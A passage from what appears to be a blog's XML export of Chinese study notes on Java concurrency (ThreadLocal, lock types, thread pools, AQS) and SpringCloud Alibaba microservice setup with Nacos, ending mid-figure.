ThreadLocal可以让每个线程绑定自己的值。（存储在堆中）</p><p>使用 get（） 和 set（） 方法来获取默认值或将其值更改为当前线程所存的副本的值，从而避免了线程安全问题。</p><p>每个Thread中都具备一个ThreadLocalMap，而ThreadLocalMap可以存储以ThreadLocal为key的键值对，value其实就是我们存储数据的地方</p><h2 id="ThreadLocal内存泄露的问题"><a href="#ThreadLocal内存泄露的问题" class="headerlink" title="ThreadLocal内存泄露的问题"></a>ThreadLocal内存泄露的问题</h2><p>实际上 ThreadLocalMap 中使用的 key 为 ThreadLocal 的弱引用，⽽ value 是强引⽤。弱引用的特点是，如果这个对象持有弱引用，那么在下一次垃圾回收的时候必然会被清理掉。</p><p>所以如果 ThreadLocal 没有被外部强引用的情况下，在垃圾回收的时候会被清理掉的，这样一来 ThreadLocalMap中使用这个 ThreadLocal 的 key 也会被清理掉。但是，value 是强引用，不会被清理，这样一来就会出现 key 为 null 的 value。假如我们不做任何措施的话，value 永远⽆法被GC 回收，如果线程长时间不被销毁，可能会产⽣内存泄露。</p><p>ThreadLocalMap实现中已经考虑了这种情况，在调用 set()、get()、remove() 方法的时候，会清理掉 key 为 null 的记录。如果说会出现内存泄漏，那只有在出现了 key 为 null 的记录后，没有手动调用 remove() 方法，并且之后也不再调用 get()、set()、remove() 方法的情况下。因此使⽤完ThreadLocal ⽅法后，最好⼿动调⽤ remove() ⽅法。</p><h1 id="Java里面的锁"><a href="#Java里面的锁" class="headerlink" title="Java里面的锁"></a>Java里面的锁</h1><p><img src="/upload/2022/09/image-f42cded7920644ef8ac6e35dace3e5cb.png" alt="image.png"></p><h2 id="乐观锁和悲观锁"><a href="#乐观锁和悲观锁" class="headerlink" title="乐观锁和悲观锁"></a>乐观锁和悲观锁</h2><p>悲观锁认为自己在使用数据的时候一定有别的线程来修改数据，因此在获取数据的时候会先加锁，确保数据不会被别的线程修改。Java中，synchronized关键字和Lock的实现类都是悲观锁。</p><p>而乐观锁认为自己在使用数据时不会有别的线程修改数据，所以不会添加锁，只是在更新数据的时候去判断之前有没有别的线程更新了这个数据。如果这个数据没有被更新，当前线程将自己修改的数据成功写入。如果数据已经被其他线程更新，则根据不同的实现方式执行不同的操作（例如报错或者自动重试）。<br>乐观锁在Java中是通过使用无锁编程来实现，最常采用的是CAS算法，Java原子类中的递增操作就通过CAS自旋实现的。</p><p>悲观锁适合写操作多的场景，先加锁可以保证写操作时数据正确。<br>乐观锁适合读操作多的场景，不加锁的特点能够使其读操作的性能大幅提升。</p><h2 id="自旋锁-VS-适应性自旋锁"><a href="#自旋锁-VS-适应性自旋锁" class="headerlink" title="自旋锁 VS 适应性自旋锁"></a>自旋锁 VS 适应性自旋锁</h2><p>问题引入</p><p>阻塞或唤醒一个Java线程需要操作系统切换CPU状态来完成，这种状态转换需要耗费处理器时间。如果同步代码块中的内容过于简单，状态转换消耗的时间有可能比用户代码执行的时间还要长。</p><p>在许多场景中，同步资源的锁定时间很短，为了这一小段时间去切换线程，线程挂起和恢复现场的花费可能会让系统得不偿失。如果物理机器有多个处理器，能够让两个或以上的线程同时并行执行，我们就可以让后面那个请求锁的线程不放弃CPU的执行时间，看看持有锁的线程是否很快就会释放锁。</p><p>而为了让当前线程“稍等一下”，我们需让当前线程进行自旋，如果在自旋完成后前面锁定同步资源的线程已经释放了锁，那么当前线程就可以不必阻塞而是直接获取同步资源，从而避免切换线程的开销。这就是自旋锁。</p><p>自旋锁缺点</p><p>它不能代替阻塞。自旋等待虽然避免了线程切换的开销，但它要占用处理器时间。如果锁被占用的时间很短，自旋等待的效果就会非常好。反之，如果锁被占用的时间很长，那么自旋的线程只会白浪费处理器资源。所以，自旋等待的时间必须要有一定的限度，如果自旋超过了限定次数（默认是10次，可以使用-XX:PreBlockSpin来更改）没有成功获得锁，就应当挂起线程。</p><p>适应性自旋锁</p><p>自适应意味着自旋的时间（次数）不再固定，而是由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定。如果在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持有锁的线程正在运行中，那么虚拟机就会认为这次自旋也是很有可能再次成功，进而它将允许自旋等待持续相对更长的时间。如果对于某个锁，自旋很少成功获得过，那在以后尝试获取这个锁时将可能省略掉自旋过程，直接阻塞线程，避免浪费处理器资源。</p><h2 id="公平锁-VS-非公平锁"><a href="#公平锁-VS-非公平锁" class="headerlink" title="公平锁 VS 非公平锁"></a>公平锁 VS 非公平锁</h2><p>公平锁是指多个线程 按照申请锁的顺序来获取锁 ，线程直接进入队列中排队，队列中的第一个线程才能获得锁。公平锁的优点是等待锁的线程不会饿死。缺点是整体吞吐效率相对非公平锁要低，等待队列中除第一个线程以外的所有线程都会阻塞，CPU唤醒阻塞线程的开销比非公平锁大。</p><p>非公平锁是多个线程 加锁时直接尝试获取锁 ，获取不到才会到等待队列的队尾等待 。但如果此时锁刚好可用，那么这个线程可以无需阻塞直接获取到锁，所以非公平锁有可能出现后申请锁的线程先获取锁的场景。非公平锁的优点是可以减少唤起线程的开销，整体的吞吐效率高，因为线程有几率不阻塞直接获得锁，CPU不必唤醒所有线程。缺点是处于等待队列中的线程可能会饿死，或者等很久才会获得锁。</p><p>综上，公平锁就是通过同步队列来实现多个线程按照申请锁的顺序来获取锁，从而实现公平的特性。非公平锁加锁时不考虑排队等待问题，直接尝试获取锁，所以存在后申请却先获得锁的情况。</p><h2 id="可重入锁-VS-非可重入锁"><a href="#可重入锁-VS-非可重入锁" class="headerlink" title="可重入锁 VS 非可重入锁"></a>可重入锁 VS 非可重入锁</h2><p>可重入锁又名递归锁，是指在同一个线程在外层方法获取锁的时候，再进入该线程的内层方法会自动获取锁（前提锁对象得是同一个对象或者class），不会因为之前已经获取过还没释放而阻塞。Java中ReentrantLock和synchronized都是可重入锁，可重入锁的一个优点是可一定程度避免死锁。</p><p><img src="/upload/2022/09/image-8424108c47a24c3191699b0a2e2cab7e.png" alt="image.png"></p><p>在上面的代码中，类中的两个方法都是被内置锁synchronized修饰的，doSomething()方法中调用doOthers()方法。因为内置锁是可重入的，所以同一个线程在调用doOthers()时可以直接获得当前对象的锁，进入doOthers()进行操作。</p><p>如果是一个不可重入锁，那么当前线程在调用doOthers()之前需要将执行doSomething()时获取当前对象的锁释放掉，实际上该对象锁已被当前线程所持有，且无法释放。所以此时会出现死锁。</p><h2 id="独享锁-VS-共享锁"><a href="#独享锁-VS-共享锁" class="headerlink" title="独享锁 VS 共享锁"></a>独享锁 VS 共享锁</h2><p>独享锁也叫排他锁，是指该锁一次只能被一个线程所持有。如果线程T对数据A加上排它锁后，则其他线程不能再对A加任何类型的锁。获得排它锁的线程即能读数据又能修改数据。JDK中的synchronized和JUC中Lock的实现类就是互斥锁。</p><p>共享锁是指该锁可被多个线程所持有。如果线程T对数据A加上共享锁后，则其他线程只能对A再加共享锁，不能加排它锁。获得共享锁的线程只能读数据，不能修改数据。</p><p>独享锁与共享锁也是通过AQS来实现的，通过实现不同的方法，来实现独享或者共享。</p><h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h1><p>J.U.C提供的线程池：ThreadPoolExecutor类</p><p>线程池的好处</p><ul><li>降低资源消耗：通过池化技术重复利用已创建的线程，降低线程创建和销毁造成的损耗。</li><li>提高响应速度：任务到达时，无需等待线程创建即可立即执行。</li><li>提高线程的可管理性：线程是稀缺资源，如果无限制创建，不仅会消耗系统资源，还会因为线程的不合理分布导致资源调度失衡，降低系统的稳定性。使用线程池可以进行统一的分配、调优和监控。</li><li>提供更多更强大的功能：线程池具备可拓展性，允许开发人员向其中增加更多的功能。比如延时定时线程池ScheduledThreadPoolExecutor，就允许任务延期执行或定期执行。</li></ul><h2 id="常用线程池"><a href="#常用线程池" class="headerlink" title="常用线程池"></a>常用线程池</h2><ol><li>Executors.newCachedThreadPool() 可缓存线程池，这个是一个无界的队列</li><li>Executors.newFixedThreadPool(int n)：创建一个可重用固定个数的线程池。</li><li>Executors.newScheduledThreadPool(int n)：创建一个定长线程池，支持定时及周期性任务执行。</li><li>xecutors.newSingleThreadExecutor()：创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。</li></ol><h2 id="线程池使用"><a href="#线程池使用" class="headerlink" title="线程池使用"></a>线程池使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建固定大小的线程池:</span></span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">executor</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 提交任务: 返回一个future。可以用这个future来判断任务是否成功完成</span></span><br><span class="line">executor.submit(task1);</span><br><span class="line"><span class="comment">// 提交任务: 没有返回值。可以执行任务，但无法判断任务是否成功完成。</span></span><br><span class="line">executor.execute(task1);</span><br><span class="line"><span class="comment">// 关闭线程池: 在线程池队列中的提交的任务会执行，无法提交新的任务，注意调用这个方法，线程池不会等待（wait）在执行的任务执行完成，可以使用awaitTermination实现这个目的。这里需要注意的是：在执行的任务因为是异步线程执行的，任务还是会继续执行，只是说线程池不会阻塞等待任务执行完成</span></span><br><span class="line">executor.shutdown();</span><br><span class="line"><span class="comment">// 试图关闭正在执行的任务，不会执行已经提交到队列但是还没有执行的任务，返回等待执行的任务列表，同时此方法不会等待那些正在执行的任务执行完，等待执行的任务会从线程池队列移除。</span></span><br><span class="line">executor.shutdownNow()</span><br></pre></td></tr></table></figure><h2 id="线程池参数"><a href="#线程池参数" class="headerlink" title="线程池参数"></a>线程池参数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ThreadPoolExecutor</span><span class="params">(<span class="type">int</span> corePoolSize,  // 线程池的核心线程数</span></span><br><span class="line"><span class="params">                          <span class="type">int</span> maximumPoolSize, // 线程池的最大线程数</span></span><br><span class="line"><span class="params">                          <span class="type">long</span> keepAliveTime, // 当线程数大于核心时，多余的空闲线程等待新任务的存活时间。</span></span><br><span class="line"><span class="params">                          TimeUnit unit, // keepAliveTime的时间单位</span></span><br><span class="line"><span class="params">                          ThreadFactory threadFactory, // 线程工厂</span></span><br><span class="line"><span class="params">                          BlockingQueue&lt;Runnable&gt; workQueue,// 用来储存等待执行任务的队列</span></span><br><span class="line"><span class="params">                          RejectedExecutionHandler handler // 拒绝策略</span></span><br><span class="line"><span class="params">                          )</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>corePoolSize 线程池保留的最小线程数。一开始是不会立即启动的，线程会慢慢增加，直到达到这个数为止，如果线程池中的线程少于此数目，（当然我们也可以调用prestartAllCoreThreads方法来创建所有的线程）则在执行execut()时创建。</li><li>maximumPoolSize 线程池中允许拥有的最大线程数。</li><li>keepAliveTime、unit 只有当线程池中的线程数大于corePoolSize时，keepAliveTime才会起作用<br>当线程池中的线程数大于corePoolSize时，如果一个线程空闲的时间达到keepAliveTime，则会终止，直到线程池中的线程数不超过corePoolSize。但是如果调用了allowCoreThreadTimeOut(boolean)方法，在线程池中的线程数不大于corePoolSize时，keepAliveTime参数也会起作用，直到线程池中的线程数为0；</li><li>threadFactory 使用默认的即可</li><li>workQueue 工作队列，存放提交的等待任务，其中有队列大小的限制</li><li>handler 拒绝策略，有以下四种取值： <ul><li>AbortPolicy（默认）：丢弃任务并抛出RejectedExecutionException异常。 </li><li>CallerRunsPolicy：由调用线程处理该任务。(例如io操作，线程消费速度没有NIO快，可能导致阻塞队列一直增加，此时可以使用这个模式) </li><li>DiscardPolicy：丢弃任务，但是不抛出异常。 （可以配合这种模式进行自定义的处理方式） </li><li>DiscardOldestPolicy：丢弃队列最早的未处理任务，然后重新尝试执行任务（重复执行）</li></ul></li></ul><h2 id="三种阻塞队列"><a href="#三种阻塞队列" class="headerlink" title="三种阻塞队列"></a>三种阻塞队列</h2><p>首先看一下新任务进入时线程池的执行策略： 如果运行的线程少于corePoolSize，则 Executor始终首选添加新的线程，而不进行排队。（如果当前运行的线程小于corePoolSize，则任务根本不会存入queue中，而是直接运行） 如果运行的线程大于等于 corePoolSize，则 Executor始终首选将请求加入队列，而不添加新的线程。 如果无法将请求加入队列，则创建新的线程，除非创建此线程超出 maximumPoolSize，在这种情况下，任务将被拒绝。 主要有3种类型的BlockingQueue：</p><ul><li>无界队列 队列大小无限制，常用的为无界的LinkedBlockingQueue，使用该队列做为阻塞队列时要尤其当心，当任务耗时较长时可能会导致大量新任务在队列中堆积最终导致OOM。</li><li>有界队列 常用的有两类，一类是遵循FIFO原则的队列如ArrayBlockingQueue与有界的LinkedBlockingQueue，另一类是优先级队列如PriorityBlockingQueue。PriorityBlockingQueue中的优先级由任务的Comparator决定。 使用有界队列时队列大小需和线程池大小互相配合，线程池较小有界队列较大时可减少内存消耗，降低cpu使用率和上下文切换，但是可能会限制系统吞吐量。</li><li>同步移交 如果不希望任务在队列中等待而是希望将任务直接移交给工作线程，可使用SynchronousQueue作为等待队列。SynchronousQueue不是一个真正的队列，而是一种线程之间移交的机制。要将一个元素放入SynchronousQueue中，必须有另一个线程正在等待接收这个元素。只有在使用无界线程池或者有饱和策略时才建议使用该队列。</li></ul><h2 id="四种拒绝策略"><a href="#四种拒绝策略" class="headerlink" title="四种拒绝策略"></a>四种拒绝策略</h2><ul><li>AbortPolicy中止策略 使用该策略时在饱和时会抛出RejectedExecutionException（继承自RuntimeException），调用者可捕获该异常自行处理。</li><li>DiscardPolicy抛弃策略 不做任何处理直接抛弃任务</li><li>DiscardOldestPolicy抛弃旧任务策略 先将阻塞队列中的头元素出队抛弃，再尝试提交任务。如果此时阻塞队列使用PriorityBlockingQueue优先级队列，将会导致优先级最高的任务被抛弃，因此不建议将该种策略配合优先级队列使用。</li><li>CallerRunsPolicy调用者运行 既不抛弃任务也不抛出异常，直接运行任务的run方法，换言之将任务回退给调用者来直接运行。使用该策略时线程池饱和后将由调用线程池的主线程自己来执行任务，因此在执行任务的这段时间里主线程无法再提交新任务，从而使线程池中工作线程有时间将正在处理的任务处理完成。</li></ul><h2 id="合理配置线程池核心线程数（IO密集型和CPU密集型）"><a href="#合理配置线程池核心线程数（IO密集型和CPU密集型）" class="headerlink" title="合理配置线程池核心线程数（IO密集型和CPU密集型）"></a>合理配置线程池核心线程数（IO密集型和CPU密集型）</h2><p>CPU密集型</p><p>CPU密集的意思是该任务需要大量的运算，而没有阻塞，CPU一直全速运行。 CPU密集任务只有在真正的多核CPU上才可能得到加速（通过多线程），而在单核CPU上，无论你开几个模拟的多线程该任务都不可能得到加速，因为CPU总的运算能力就那些。 CPU密集型任务配置尽可能少的线程数量： 一般公式：CPU核数+1个线程的线程池</p><p>IO密集型</p><p>IO包括：数据库交互，文件上传下载，网络传输等 方法一： 由于IO密集型任务线程并不是一直在执行任务，则应配置尽可能多的线程，如CPU核数*2 方法二： IO密集型，即该任务需要大量的IO，即大量的阻塞。 在单线程上运IO密集型的任务会导致浪费大量的CPU运算能力浪费在等待。 所以在IO密集型任务中使用多线程可以大大的加速程序运行，即使在单核CPU上，这种加速主要就是利用了被浪费掉的阻塞时间。 IO密集型时，大部分线程都阻塞，故需要多配置线程数： 参考公式：CPU核数 &#x2F;（1 - 阻系数） 比如8核CPU：8&#x2F;(1 - 0．9)&#x3D;80个线程数 阻塞系数在0.8~0.9之间</p><h1 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h1><p>也叫AbstractQueuedSynchronizer（AQS），是一个抽象的队列式同步器，AQS定义了一套多线程访问共享资源的同步器框架，许多同步类实现都依赖于它（很多锁也是基于这个框架的），AQS示意图如下<br><img src="/upload/2022/09/image-7267354614b5453b803bb84866f0365a.png" alt="image.png"></p><p>它维护了一个volatile int state（代表共享资源，使用volatile修饰）和一个FIFO线程等待队列（多线程争用资源被阻塞时会进入此队列）。</p><h2 id="相关属性和资源共享方式"><a href="#相关属性和资源共享方式" class="headerlink" title="相关属性和资源共享方式"></a>相关属性和资源共享方式</h2><p>state的访问方式有三种</p><p>getState()<br>setState()<br>compareAndSetState()</p><p>AQS有两种资源的共享方式</p><p>Exclusive（独占，只有一个线程能执行，如ReentrantLock）<br>Share（共享，多个线程可同时执行，如Semaphore&#x2F;CountDownLatch）</p><p>不同的自定义同步器争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源state的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队&#x2F;唤醒出队等），AQS已经在顶层实现好了。自定义同步器实现时主要实现以下几种方法：</p><p>isHeldExclusively()：该线程是否正在独占资源。只有用到condition才需要去实现它。<br>tryAcquire(int)：独占方式。尝试获取资源，成功则返回true，失败则返回false。<br>tryRelease(int)：独占方式。尝试释放资源，成功则返回true，失败则返回false。<br>tryAcquireShared(int)：共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。<br>tryReleaseShared(int)：共享方式。尝试释放资源，如果释放后允许唤醒后续等待结点返回true，否则返回false。</p><p>以ReentrantLock为例，state初始化为0，表示未锁定状态。A线程lock()时，会调用tryAcquire()独占该锁并将state+1。此后，其他线程再tryAcquire()时就会失败，直到A线程unlock()到state&#x3D;0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A线程自己是可以重复获取此锁的（state会累加），这就是可重入的概念。但要注意，获取多少次就要释放多么次，这样才能保证state是能回到零态的。</p><p>一般来说，自定义同步器要么是独占方法，要么是共享方式，他们也只需实现tryAcquire-tryRelease、tryAcquireShared-tryReleaseShared中的一种即可。但AQS也支持自定义同步器同时实现独占和共享两种方式，如ReentrantReadWriteLock。</p><h2 id="节点状态"><a href="#节点状态" class="headerlink" title="节点状态"></a>节点状态</h2><p>队列里面放的是节点，而节点是对每一个等待获取资源的线程的封装，其包含了需要同步的线程本身及其等待状态，如是否被阻塞、是否等待唤醒、是否已经被取消等。变量waitStatus则表示当前Node结点的等待状态，共有5种取值CANCELLED、SIGNAL、CONDITION、PROPAGATE、0。</p><p>CANCELLED(1)：表示当前结点已取消调度。当timeout或被中断（响应中断的情况下），会触发变更为此状态，进入该状态后的结点将不会再变化。<br>SIGNAL(-1)：表示后继结点在等待当前结点唤醒。后继结点入队时，会将前继结点的状态更新为SIGNAL。<br>CONDITION(-2)：表示结点等待在Condition上，当其他线程调用了Condition的signal()方法后，CONDITION状态的结点将从等待队列转移到同步队列中，等待获取同步锁。<br>PROPAGATE(-3)：共享模式下，前继结点不仅会唤醒其后继结点，同时也可能会唤醒后继的后继结点。<br>0：新结点入队时的默认状态。<br>注意，负值表示结点处于有效等待状态，而正值表示结点已被取消。所以源码中很多地方用&gt;0、&lt;0来判断结点的状态是否正常。</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面经笔经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微服务</title>
    <link href="/2023/06/18/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    <url>/2023/06/18/%E5%BE%AE%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="分布式基础概念"><a href="#分布式基础概念" class="headerlink" title="分布式基础概念"></a>分布式基础概念</h2><h3 id="1、微服务"><a href="#1、微服务" class="headerlink" title="1、微服务"></a>1、微服务</h3><p>微服务架构风格，就像是把一个单独的应用程序开发为一套小服务，每个小服务运行在自己的进程中，并使用轻量级机制通信，通常是HTTP API。这些服务围绕业务能力来构建，并通过完全自动化部署机制来独立部署。这些服务使用不同的编程语言书写，以及不同数据存储技术，并保持最低限度的集中式管理。<br>简而言之：拒绝大型单体应用，基于业务边界进行服务微化拆分，各个服务独立部署运行。</p><h3 id="2、集群-分布式-节点"><a href="#2、集群-分布式-节点" class="headerlink" title="2、集群&amp;分布式&amp;节点"></a>2、集群&amp;分布式&amp;节点</h3><p>集群是个物理形态，分布式是个工作方式。<br>只要是一堆机器，就可以叫集群，他们是不是一起协作着干活，这个谁也不知道；</p><p>《分布式系统原理与范型》定义：<br>“分布式系统是若干独立计算机的集合，这些计算机对于用户来说就像单个相关系统”<br>分布式系统（distributed system）是建立在网络之上的软件系统。<br>分布式是指将不同的业务分布在不同的地方。<br>集群指的是将几台服务器集中在一起，实现同一业务。</p><p>例如：京东是一个分布式系统，众多业务运行在不同的机器，所有业务构成一个大型的业务集群。每一个小的业务，比如用户系统，访问压力大的时候一台服务器是不够的。我们就应该将用户系统部署到多个服务器，也就是每一个业务系统也可以做集群化；<br>分布式中的每一个节点，都可以做集群。而集群并不一定就是分布式的。</p><p>节点：集群中的一个服务器</p><h3 id="3、远程调用"><a href="#3、远程调用" class="headerlink" title="3、远程调用"></a>3、远程调用</h3><p>在分布式系统中，各个服务可能处于不同主机，但是服务之间不可避免的需要互相调用，我们称为远程调用。<br>SpringCloud 中使用HTTP+JSON 的方式完成远程调用</p><h3 id="4、负载均衡"><a href="#4、负载均衡" class="headerlink" title="4、负载均衡"></a>4、负载均衡</h3><p>分布式系统中，A 服务需要调用B 服务，B 服务在多台机器中都存在，A 调用任意一个服务器均可完成功能。<br>为了使每一个服务器都不要太忙或者太闲，我们可以负载均衡的调用每一个服务器，提升网站的健壮性。</p><p>常见的负载均衡算法：<br>轮询：为第一个请求选择健康池中的第一个后端服务器，然后按顺序往后依次选择，直到最后一个，然后循环。<br>最小连接：优先选择连接数最少，也就是压力最小的后端服务器，在会话较长的情况下可以考虑采取这种方式。<br>散列：根据请求源的IP 的散列（hash）来选择要转发的服务器。这种方式可以一定程度上保证特定用户能连接到相同的服务器。如果你的应用需要处理状态而要求用户能连接到和之前相同的服务器，可以考虑采取这种方式。</p><h3 id="5、服务注册-发现-注册中心"><a href="#5、服务注册-发现-注册中心" class="headerlink" title="5、服务注册&#x2F;发现&amp;注册中心"></a>5、服务注册&#x2F;发现&amp;注册中心</h3><p>A 服务调用 B 服务，A 服务并不知道B 服务当前在哪几台服务器有，哪些正常的，哪些服务已经下线。解决这个问题可以引入注册中心；<br>如果某些服务下线，我们其他人可以实时的感知到其他服务的状态，从而避免调用不可用的服务</p><h3 id="6、配置中心"><a href="#6、配置中心" class="headerlink" title="6、配置中心"></a>6、配置中心</h3><p>每一个服务最终都有大量的配置，并且每个服务都可能部署在多台机器上。我们经常需要变更配置，我们可以让每个服务在配置中心获取自己的配置。<br>配置中心用来集中管理微服务的配置信息</p><h3 id="7、服务熔断-服务降级"><a href="#7、服务熔断-服务降级" class="headerlink" title="7、服务熔断&amp;服务降级"></a>7、服务熔断&amp;服务降级</h3><p>在微服务架构中，微服务之间通过网络进行通信，存在相互依赖，当其中一个服务不可用时，有可能会造成雪崩效应。要防止这样的情况，必须要有容错机制来保护服务。<br>1）、服务熔断<br>a. 设置服务的超时，当被调用的服务经常失败到达某个阈值，我们可以开启断路保护机制，后来的请求不再去调用这个服务。本地直接返回默认<br>的数据<br>2）、服务降级<br>a. 在运维期间，当系统处于高峰期，系统资源紧张，我们可以让非核心业务降级运行。降级：某些服务不处理，或者简单处理【抛异常、返回NULL、调用Mock 数据、调用Fallback 处理逻辑】。</p><h3 id="8、API-网关"><a href="#8、API-网关" class="headerlink" title="8、API 网关"></a>8、API 网关</h3><p>在微服务架构中，API Gateway 作为整体架构的重要组件，它抽象了微服务中都需要的公共<br>功能，同时提供了客户端负载均衡，服务自动熔断，灰度发布，统一认证，限流流控，日志统计等丰富的功能，帮助我们解决很多API 管理难题。</p><h2 id="SpringCloud-Alibaba简介"><a href="#SpringCloud-Alibaba简介" class="headerlink" title="SpringCloud Alibaba简介"></a>SpringCloud Alibaba简介</h2><h3 id="4-1-搭配环境"><a href="#4-1-搭配环境" class="headerlink" title="4.1 搭配环境"></a>4.1 搭配环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;spring-boot.version&gt;2.1.8.RELEASE&lt;/spring-boot.version&gt;</span><br><span class="line">&lt;spring-cloud.version&gt;Greenwich.SR3&lt;/spring-cloud.version&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在common的pom.xml中加入</span><br><span class="line"># 下面是依赖管理，相当于以后再dependencies里引spring cloud alibaba就不用写版本号， 全用dependencyManagement进行管理</span><br><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">     &lt;dependencies&gt;</span><br><span class="line">         &lt;dependency&gt;</span><br><span class="line">             &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">             &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;</span><br><span class="line">             &lt;version&gt;2.1.0.RELEASE&lt;/version&gt;</span><br><span class="line">             &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">             &lt;scope&gt;import&lt;/scope&gt;</span><br><span class="line">         &lt;/dependency&gt;</span><br><span class="line">     &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br></pre></td></tr></table></figure><h3 id="4-2-Nacos"><a href="#4-2-Nacos" class="headerlink" title="4.2 Nacos"></a>4.2 Nacos</h3><p>一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>作为我们的注册中心和配置中心。</p><p>先了解一下 Spring Cloud 应用如何接入 Nacos Discovery。<br>1 首先，修改 common中的pom.xml 文件，引入 Nacos Discovery Starter。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>2 在应用的common中的application.yml 配置文件中配置 Nacos Server 地址和微服务名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># Tomcat</span><br><span class="line">server: </span><br><span class="line">  port: 9200</span><br><span class="line"></span><br><span class="line"># Spring</span><br><span class="line">spring: </span><br><span class="line">  application:</span><br><span class="line">    # 应用名称</span><br><span class="line">    name: ruoyi-auth</span><br><span class="line">  profiles:</span><br><span class="line">    # 环境配置</span><br><span class="line">    active: dev</span><br><span class="line">  cloud:</span><br><span class="line">    nacos:</span><br><span class="line">      discovery:</span><br><span class="line">        # 服务注册地址</span><br><span class="line">        server-addr: 127.0.0.1:8848</span><br><span class="line">      config:</span><br><span class="line">        # 配置中心地址</span><br><span class="line">        server-addr: 127.0.0.1:8848</span><br><span class="line">        # 配置文件格式</span><br><span class="line">        file-extension: yml</span><br><span class="line">        # 共享配置</span><br><span class="line">        shared-configs:</span><br><span class="line">          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span><br></pre></td></tr></table></figure><p>3 我们要配置nacos服务器的地址，也就是注册中心地址，但是我们还没有nacos服务器，所以我们需要启动nacos server创建nacos服务器（软件官方可以下载）<br>windows启动命令：startup.cmd -m standalone</p><p>推荐使用docker进行部署：<br>docker-compose:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ruoyi-nacos:</span><br><span class="line">    container_name: ruoyi-nacos</span><br><span class="line">    image: nacos/nacos-server</span><br><span class="line">    build:</span><br><span class="line">      context: ./nacos</span><br><span class="line">    environment:</span><br><span class="line">      - MODE=standalone</span><br><span class="line">    volumes:</span><br><span class="line">      - ./nacos/logs/:/home/nacos/logs</span><br><span class="line">      - ./nacos/conf/application.properties:/home/nacos/conf/application.properties</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8848:8848&quot;</span><br><span class="line">      - &quot;9848:9848&quot;</span><br><span class="line">      - &quot;9849:9849&quot;</span><br><span class="line">    depends_on:</span><br><span class="line">      - ruoyi-mysql</span><br></pre></td></tr></table></figure><p>docker file(这个好像不需要)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 